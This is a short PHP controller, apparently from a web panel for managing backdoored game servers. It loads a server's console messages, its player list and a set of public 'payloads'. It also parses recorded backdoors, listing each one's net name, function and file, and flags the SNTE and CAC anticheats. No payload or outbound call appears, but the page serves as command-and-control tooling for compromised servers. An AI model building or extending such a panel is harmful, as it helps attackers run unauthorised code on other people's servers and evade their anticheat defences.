<?php
if(!Server::ServerExist($_GET['id'])) {
	die(header('location:/servers'));
}

$server = Server::GetServer($_GET['id']);

$title = $server['ip'];

if($server['owner'] != $AUTHUSER['id'] && $AUTHUSER['roles'] < 3) {
	die(header('location:/servers'));
}

$index = 1;
$messages =  Console::GetLastServerConsole($server['ip']);
$categories = Category::getAll();
$payloads = Payload::getAllPublic();
$players = json_decode($server["playerlist"], true);

// Backdoor and Anticheat detection
$backdoors = json_decode($server['backdoors'], true);
$detection = [];
$detection['anticheat']['snte'] = false;
$detection['anticheat']['cac'] = false;

foreach($backdoors as $backdoor) {

	if(isset($backdoor['anticheat'])) {
		if($backdoor['anticheat'] == "SNTE") {
			$detection['anticheat']['snte'] = true;
		}
		if($backdoor['anticheat'] == "CAC") {
			$detection['anticheat']['cac'] = true;
		}
	}

	if(isset($backdoor['net'])) {
		$detection['backdoor'][] = ['name' => $backdoor['net'], 'function' => $backdoor['func'], 'filename' => $backdoor['file']];
	}
}

$server_status = ($server['last_update'] + 120 >= time()) ? '#22a003' : '#ba0000';

?>